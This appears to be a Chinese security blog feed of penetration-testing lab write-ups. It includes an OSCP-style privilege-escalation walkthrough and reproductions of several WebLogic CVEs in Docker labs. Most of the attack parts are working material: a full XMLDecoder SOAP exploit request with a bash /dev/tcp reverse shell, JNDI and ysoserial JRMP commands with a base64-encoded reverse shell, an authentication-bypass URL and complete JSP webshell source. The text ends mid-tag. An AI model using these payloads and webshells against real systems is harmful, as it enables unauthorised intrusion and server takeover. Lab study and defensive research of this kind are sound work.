title="登陆页面目录扫描"></a>登陆页面目录扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.174.161:7331 -u admin:passwd</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240802191437778.png" alt="image-20240802191437778"></p><p>发现data目录和robots.txt文件，分别访问</p><p><img src="/../image/image-20240802191515914.png" alt="image-20240802191515914"></p><p><img src="/../image/image-20240802191526369.png" alt="image-20240802191526369"></p><p>可以发现一个data文件，下载尝试分析文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://ip:7331/data/data --user admin --password passwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file data</span><br><span class="line">PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections</span><br></pre></td></tr></table></figure><p>是一个PE文件，放到ida里反编译一下</p><p><img src="/../image/image-20240802195504521.png" alt="image-20240802195504521"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">guest:7R1n17yN30</span><br></pre></td></tr></table></figure><p>可以在dispose中找到一个账号密码对，结合剩下一个的ssh端口，推测是用该账号密码连接</p><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh guest@192.168.174.161 -p6464</span><br></pre></td></tr></table></figure><p>连上后，发现很多指令都用不了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $SHELL</span><br></pre></td></tr></table></figure><p>发现是rbash，尝试连接默认shell</p><p><img src="/../image/image-20240802200900060.png" alt="image-20240802200900060"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh guest@192.168.174.161 -p6464 -t &quot;bash --noprofile&quot;</span><br></pre></td></tr></table></figure><ul><li><code>&quot;bash --noprofile&quot;</code> 是在远程计算机上执行的命令。<code>bash</code> 是Bourne Again Shell的简称，是一种常用的Unix shell。<code>--noprofile</code> 选项告诉bash不要读取用户的profile文件，这在某些情况下可以防止执行一些可能不安全的脚本。</li></ul><p>再次echo shell,虽然说还是rbash但还是可以执行其它命令的，我们可以创建一个空的ssh的rsa密钥</p><p><img src="/../image/image-20240802200926473.png" alt="image-20240802200926473"></p><p>这个用户可以不用密码利用root身份去运行一个特定的文件。利用trinity这个用户身份还可以执行cp命令，看来这是突破口了。</p><p>利用cp将bash复制到root可以执行的文件位置，失败</p><p><img src="/../image/image-20240802201338624.png" alt="image-20240802201338624"></p><p>vi提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi</span><br><span class="line">:!/bin/sh</span><br><span class="line">export PATH=&quot;/usr/bin&quot;</span><br><span class="line">/usr.bin/bash</span><br></pre></td></tr></table></figure><p>find一下有没有提权的文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240802202925298.png" alt="image-20240802202925298"></p><p>利用ssh-keygen生成一个密钥，准备给trinity用。</p><p><img src="/../image/image-20240802201425373.png" alt="image-20240802201425373"></p><p>查看一下sshd的配置文件，可以看到开着pubkey认证，并且密钥保存在.ssh&#x2F;authorized_keys，下一步就把我们生成的密钥放到trinity用户目录下就行了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240802201638580.png" alt="image-20240802201638580"></p><p>把刚生成的id_rsa.pub权限修改为777，让非guest的用户也有执行权限，然后利用trinity身份的cp命令将这个文件复制到trinity&#x2F;.ssh&#x2F;authorized_keys</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 id_rsa.pub</span><br><span class="line">chmod 777 .ssh</span><br><span class="line">sudo -u trinity /bin/cp .ssh/id_rsa.pub  /home/trinity/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>再ssh登陆trinity</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh trinity@127.0.0.1 -i .ssh/id_rsa.pub -p 6464</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240802204428518.png" alt="image-20240802204428518"></p><p>登录trinity用户发现可以以root用户权限无密码使用<code>oracle</code>命令，直接将<code>/usr/bin/bash</code>复制到<code>trinity家目录</code>下并改名为<code>oracle</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/bin/bash oracle</span><br><span class="line">chmod +x oracle</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240802204506245.png" alt="image-20240802204506245"></p><p>调用oracle，成功拥有root权限，在root目录下找到flag.txt文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./oracle </span><br><span class="line">cd /root/</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240802204640441.png" alt="image-20240802204640441"></p>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>weblogic</title>
      <link href="/2024/07/23/weblogic/"/>
      <url>/2024/07/23/weblogic/</url>
      
        <content type="html"><![CDATA[<h1 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h1><h2 id="简要介绍"><a href="#简要介绍" class="headerlink" title="简要介绍"></a>简要介绍</h2><p><a href="https://blog.csdn.net/rumil/article/details/133036788">https://blog.csdn.net/rumil/article/details/133036788</a></p><p><a href="https://www.freebuf.com/articles/web/372568.html">https://www.freebuf.com/articles/web/372568.html</a></p><p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机。T3协议在开放WebLogic控制台端口的应用上默认开启。攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击（开放Weblogic控制台的7001端口，默认会开启T3协议服务，T3协议触发的Weblogic Server WLS Core Components中存在反序列化漏洞，攻击者可以发送构造的恶意T3协议数据，获取目标服务器权限。）</p><p>T3协议缺陷实现了Java虚拟机的远程方法调用（RMI）,能够在本地虚拟机上调用远端代码。</p><p><strong>T3协议：</strong></p><p>用于在Weblogic服务器和其他类型的Java程序之间传输信息的协议。Weblogic会跟踪连接到应用程序的每个Java虚拟机，要将流量传输到Java虚拟机，Weblogic会创建一个T3连接。该链接会通过消除在网络之间的多个协议来最大化效率，从而使用较少的操作系统资源。用于T3连接的协议还可以最大限度减少数据包大小，提高传输速度。</p><p><strong>RMI方法：</strong></p><p>远程方法调用，除了该对象本身的虚拟机，其它的虚拟机也可以调用该对象的方法。（对象的虚拟化和反序列化广泛应用到RMI和网络传输中）</p><p><strong>JRMP：</strong></p><p>Java远程消息交换协议JRMP。</p><p>JRMP是一个Java远程方法协议，该协议基于TCP&#x2F;IP之上，RMI协议之下。也就是说RMI该协议传递时底层使用的是JRMP协议，而JRMP底层则是基于TCP传递。</p><p>RMI默认使用的JRMP进行传递数据，并且JRMP协议只能作用于RMI协议。当然RMI支持的协议除了JRMP还有IIOP协议，而在Weblogic里面的T3协议其实也是基于RMI去进行实现的。</p><h2 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h2><p>简要介绍：<a href="https://www.cnblogs.com/chen-w/p/14652153.html">https://www.cnblogs.com/chen-w/p/14652153.html</a></p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>首先使用docker起一个weblogic CVE-2017-1027的环境，进入到vulhub&#x2F;weblogic&#x2F;CVE-2017-1027</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>启动成功后</p><p><img src="/../image/image-20240716213102663.png" alt="image-20240716213102663"></p><figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>查看运行状态</p><p><img src="/../image/image-20240716213125924.png" alt="image-20240716213125924"></p><p>接着去访问本机的7001端口，出现如下页面，说明服务成功开启：</p><p><img src="/../image/image-20240716214217994.png" alt="image-20240716214217994"></p><p>访问&#x2F;wls-wsat&#x2F;CoordinatorPortType</p><p><img src="/../image/image-20240716214533663.png" alt="image-20240716214533663"></p><p>可以先扫一下服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.174.137</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240716222238125.png" alt="image-20240716222238125"></p><p>用相关漏洞的扫描工具也可以</p><p><img src="/../image/image-20240716222344082.png" alt="image-20240716222344082"></p><h3 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="漏洞poc"></a>漏洞poc</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/vpsip/ncport 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240718205520947.png" alt="image-20240718205520947"></p><p>能弹啊，docker为什么弹不了，还要配置网卡吗</p><p>发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.1.15:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 637</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.174.137/888 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br><span class="line">12345678910111213141516171819202122232425262728293031</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="CVE-2023-21839"><a href="#CVE-2023-21839" class="headerlink" title="CVE-2023-21839"></a>CVE-2023-21839</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Weblogic 允许远程用户在未经授权的情况下通过IIOP&#x2F;T3进行JNDI lookup 操作，当JDK版本过低或本地存在javaSerializedData时，这可能会导致RCE漏洞。</p><p>WebLogic 存在远程代码执行漏洞（CVE-2023-21839&#x2F;CNVD-2023-04389），由于Weblogic IIOP&#x2F;T3协议存在缺陷，当IIOP&#x2F;T3协议开启时，允许未经身份验证的攻击者通过IIOP&#x2F;T3协议网络访问攻击存在安全风险的WebLogic Server，漏洞利用成功WebLogic Server可能被攻击者接管执行任意命令导致服务器沦陷或者造成严重的敏感数据泄露。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>WebLogic_Server &#x3D; 12.2.1.3.0<br>WebLogic_Server &#x3D; 12.2.1.4.0<br>WebLogic_Server &#x3D; 14.1.1.0.0<br><strong>CVE-2023-21839是一个weblogic的JNDI注入漏洞。</strong></p><p>由于Weblogic t3&#x2F;iiop协议支持远程绑定对象bind到服务端，并且可以通过lookup查看，当远程对象继承自OpaqueReference时，lookup查看远程对象，服务端会调用远程对象getReferent方法。weblogic.deployment.jms.ForeignOpaqueReference继承自OpaqueReference并且实现了getReferent方法，并且存在retVal &#x3D; context.lookup(this.remoteJNDIName)实现，故可以通过rmi&#x2F;ldap远程协议进行远程命令执行。</p><h3 id="环境搭建（最难的是找对应版本的jndi工具，还是自己理解合适，自己根据原理搭一个，但java不熟悉QAQ）"><a href="#环境搭建（最难的是找对应版本的jndi工具，还是自己理解合适，自己根据原理搭一个，但java不熟悉QAQ）" class="headerlink" title="环境搭建（最难的是找对应版本的jndi工具，还是自己理解合适，自己根据原理搭一个，但java不熟悉QAQ）"></a>环境搭建（最难的是找对应版本的jndi工具，还是自己理解合适，自己根据原理搭一个，但java不熟悉QAQ）</h3><p><img src="/../image/image-20240717095001438.png" alt="image-20240717095001438"></p><p>访问靶场地址：</p><p><img src="/../image/image-20240717095020526.png" alt="image-20240717095020526"></p><p>Nmap扫描：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.174.137</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240717095129769.png" alt="image-20240717095129769"></p><p>扫描验证T3是否开启：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -n -v -p 7001,7002 192.168.174.137 --script=weblogic-t3-info</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240717095226815.png" alt="image-20240717095226815"></p><p>开启LDAP和HTTP服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ava -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.174.137//攻击者ip</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240717224640807.png" alt="image-20240717224640807"></p><p>监听端口（用于接收反弹的shell）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240717224800690.png" alt="image-20240717224800690"></p><p>使用工具包</p><p>j教程使用的：<a href="https://github.com/ASkyeye/CVE-2023-21839">GitHub - ASkyeye&#x2F;CVE-2023-21839: Weblogic CVE-2023-21839 RCE (无需Java依赖一键RCE)</a></p><p>这个下载下来要在linux环境下编译，windows下编译了好像不行用，不懂是什么问题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./CVE-2023-21839 -ip 192.168.174.137 -port 7001 -ldap ldap://192.168.174.137:1389/Basic/ReverseShell/192.168.174.137/9999</span><br></pre></td></tr></table></figure><p>因为担心docker在虚拟机nat不通就没在外面测试了</p><p><img src="/../image/image-20240717225351922.png" alt="image-20240717225351922"></p><p>最后也是成功反弹shell了，这个java的漏洞的环境太难搭了</p><p>成功复现，记得关闭docker启动的镜像</p><p>关闭镜像</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose stop</span><br></pre></td></tr></table></figure><p>因为docker-compose up -d也是拉镜像启动，所以本地会有镜像保留，有些还挺大的，不需要的话可以删了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line">docker rmi -f 镜像id</span><br></pre></td></tr></table></figure><h2 id="CVE-2020-14750"><a href="#CVE-2020-14750" class="headerlink" title="CVE-2020-14750"></a>CVE-2020-14750</h2><p><a href="https://cloud.tencent.com/developer/article/2168616">https://cloud.tencent.com/developer/article/2168616</a></p><h4 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h4><p><strong>- WebLogic Console权限认证绕过漏洞（CVE-2020-14750） -</strong> </p><p>Weblogic Server是Oracle公司的一款适用于云环境和传统环境的应用<a href="https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065">服务器</a>，它提供了一个现代轻型开发平台，支持应用从开发到生产的整个生命周期管理，并简化了应用的部署和管理。Oracle官方在2020年10月发布了关键补丁更新公告，其中包括一个CVE-2020-14750为 WebLogic Console权限认证绕过的漏洞CVE-2020-14882补丁的绕过漏洞，CVSS 评分 9.8 分。CVE-2020-14882 补丁被绕过后，攻击者就可以再度绕过Console控制台的权限校验，访问原本需要登录才可以访问的资源和接口功能。尽管 CVE-2020-14883 这个后台的任意代码执行漏洞已被修复，但攻击者依然可以通过寻找利用其他合适的后台接口漏洞，实现远程代码执行，从而获取服务器权限。</p><p>影响版本：</p><ul><li>Oracle WebLogic Server 10.3.6.0.0</li><li>Oracle WebLogic Server 12.1.3.0.0</li><li>Oracle WebLogic Server 12.2.1.3.0</li><li>Oracle WebLogic Server 12.2.1.4.0</li><li>Oracle WebLogic Server 14.1.1.0.0</li></ul><h4 id="0x03-漏洞验证"><a href="#0x03-漏洞验证" class="headerlink" title="0x03 漏洞验证"></a>0x03 漏洞验证</h4><p>使用<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://github.com/0xn0ne/WeblogicScanner&source=article&objectId=2168616">WeblogicScaner</a>工具检测目标网站存在CVE-2020-14750漏洞。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 ws.py -t http://172.16.14.149:7001 -v CVE-2020-14750</span><br></pre></td></tr></table></figure><p>构造特殊URL地址绕过WebLogic Console控制台权限进行访问：</p><p><img src="/../image/image-20240718114246101.png" alt="image-20240718114246101"></p><p><img src="/../image/image-20240718114220535.png" alt="image-20240718114220535"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.14.149:7001/console/css/%25%32%65%25%32%65%25%32%66/console.portal</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240718114153961.png" alt="image-20240718114153961"></p><h2 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h2><p><a href="https://blog.csdn.net/weixin_51198941/article/details/134193310">https://blog.csdn.net/weixin_51198941/article/details/134193310</a></p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为&#x2F;ws_utc&#x2F;begin.do，&#x2F;ws_utc&#x2F;config.do</p><p>这里进后台的部分借用前面的漏洞</p><p>访问漏洞页面（需要手动设置一下环境设置Work Home Dir为，&#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.14.149:7001/ws_utc/config.do</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240718123446376.png" alt="image-20240718123446376"></p><p>点击安全 -&gt; 添加，名字和密码可以随意设置，上传jsp木马文件（登录密码为fafa）；</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cls</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;fafa&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240718123559300.png" alt="image-20240718123559300"></p><p>文件上传的路径为<a href="http://your-ip:7001/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84%E6%97%B6%E9%97%B4%E6%88%B3%E8%8E%B7%E5%8F%96%E6%96%B9%E5%BC%8F%E6%9C%89%E4%B8%A4%E7%A7%8D%EF%BC%8C%E5%85%B6%E4%B8%80%E4%B8%BAbp%E6%8A%93%E5%8C%85%E6%9F%A5%E7%9C%8B%EF%BC%8C">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，这里的时间戳获取方式有两种，其一为bp抓包查看，</a></p><p><img src="/../image/image-20240718124112290.png" alt="image-20240718124112290"></p><p>其二利用浏览器自带的检查获取，如下所示：</p><p><img src="/../image/image-20240718123631916.png" alt="image-20240718123631916"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.14.149:7001/ws_utc/css/config/keystore/1721275902739_ma.jsp</span><br></pre></td></tr></table></figure><p>这里的环境有点问题，待测，重新用docker起了环境，重复上述步骤</p><p><img src="/../image/image-20240719104623897.png" alt="image-20240719104623897"></p><p>这里先去靶场看看后台账户密码，默认管理员用户是weblogic，此处密码为h3L0YiTp</p><p><img src="/../image/image-20240719104726677.png" alt="image-20240719104726677"></p><p>输入账户密码，登录后台</p><p><img src="/../image/image-20240719104859192.png" alt="image-20240719104859192"></p><p>成功登录进去，点击base_domain可看到设置页面，然后点击高级，勾选启用Web服务测试页；</p><p><img src="/../image/image-20240719105013862.png" alt="image-20240719105013862"></p><p>点击保存</p><p><img src="/../image/image-20240719105135228.png" alt="image-20240719105135228"></p><p>访问漏洞页面<a href="http://192.168.174.137:7001/ws_utc/config.do%EF%BC%88%E9%9C%80%E8%A6%81%E6%89%8B%E5%8A%A8%E8%AE%BE%E7%BD%AE%E4%B8%80%E4%B8%8B%E7%8E%AF%E5%A2%83%E8%AE%BE%E7%BD%AEWork">http://192.168.174.137:7001/ws_utc/config.do（需要手动设置一下环境设置Work</a> Home Dir为，&#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css）</p><p><img src="/../image/image-20240719105223765.png" alt="image-20240719105223765"></p><p>点击安全 -&gt; 添加，名字和密码可以随意设置，上传jsp木马文件（登录密码为rebeyond）；</p><p><img src="/../image/image-20240719105321462.png" alt="image-20240719105321462"></p><p><img src="/../image/image-20240719105401564.png" alt="image-20240719105401564"></p><p>文件上传的路径为<a href="http://192.168.174.137:7001/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]">http://192.168.174.137:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</a></p><p><img src="/../image/image-20240719105432337.png" alt="image-20240719105432337"></p><p>尝试访问文件地址，发现文件存在且可以正常访问</p><p><img src="/../image/image-20240719105519747.png" alt="image-20240719105519747"></p><p>冰蝎连接</p><p><img src="/../image/image-20240719105611812.png" alt="image-20240719105611812"></p><p><img src="/../image/image-20240719105644878.png" alt="image-20240719105644878"></p><p>成功获得shell</p><h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><p>WebLogic T3协议反序列化命令执行漏洞(CVE-2018-2628)。Oracle WebLogic Server的T3通讯协议的实现中存在反序列化漏洞。远程攻击者通过T3协议在Weblogic Server中执行反序列化操作，利用RMI（远程方法调用） 机制的缺陷，通过 JRMP 协议（Java远程方法协议）达到执行任意反序列化代码，进而造成远程代码执行</p><p>同为WebLogic T3引起的反序列化漏洞还有CVE-2015-4852、CVE-2016-0638、CVE-2016-3510、CVE-2017-3248、CVE-2018-2893、CVE-2016-0638</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h3><p>在InboundMsgAbbrev中resolveProxyClass中，resolveProxyClass是处理rmi接口类型的，只判断了java.rmi.registry.Registry，这就会导致任意一个rmi接口都可绕过。核心部分就是JRMP（Java Remote Method protocol），在这个PoC中会序列化一个RemoteObjectInvocationHandler，它会利用UnicastRef建立到远端的tcp连接获取RMI registry，加载回来再利用readObject解析，从而造成反序列化远程代码执行。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h3><p>docker-compose起环境，访问</p><p><img src="/../image/image-20240718210439993.png" alt="image-20240718210439993"></p><p>这里先使用nmap扫描一下是否开启了WebLogic T3服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -n -v -p 7001,7002 192.168.174.137 --script=weblogic-t3-info</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240718211002989.png" alt="image-20240718211002989"></p><p>漏洞检测脚本，好多扫不出来，试试以前的旧版本</p><p><img src="/../image/image-20240718231224408.png" alt="image-20240718231224408"></p><p><img src="/../image/image-20240718212511966.png" alt="image-20240718212511966"></p><p>要专门这个探测工具才行。。但教程很多都是用旧版的ysoserial-0.1-cve-2018-2628-all，我试试新版的工具怎么用</p><p><a href="https://blog.csdn.net/st3pby/article/details/135111050">https://blog.csdn.net/st3pby/article/details/135111050</a></p><p>启动JRMP Server（下面这个是练习）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 192.168.174.160 1099 CommonsCollections1 whoami</span><br></pre></td></tr></table></figure><p>反弹shell命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.174.160:9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>base64编码<a href="https://ares-x.com/tools/runtime-exec">https://ares-x.com/tools/runtime-exec</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xNjA6OTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>开启JMRP Server服务：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections3 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xNjA6OTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p>本地监听9999端口：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure><p>这个payload还有点难生成xxd装不上记得更新下源</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar JRMPClient 192.168.174.160:7777 | xxd -p | tr -d $&#x27;\n&#x27; &amp;&amp; echo #JRMP监听的端口</span><br></pre></td></tr></table></figure><p>和之前的比，payload没有2了是JRMPClient</p><p><img 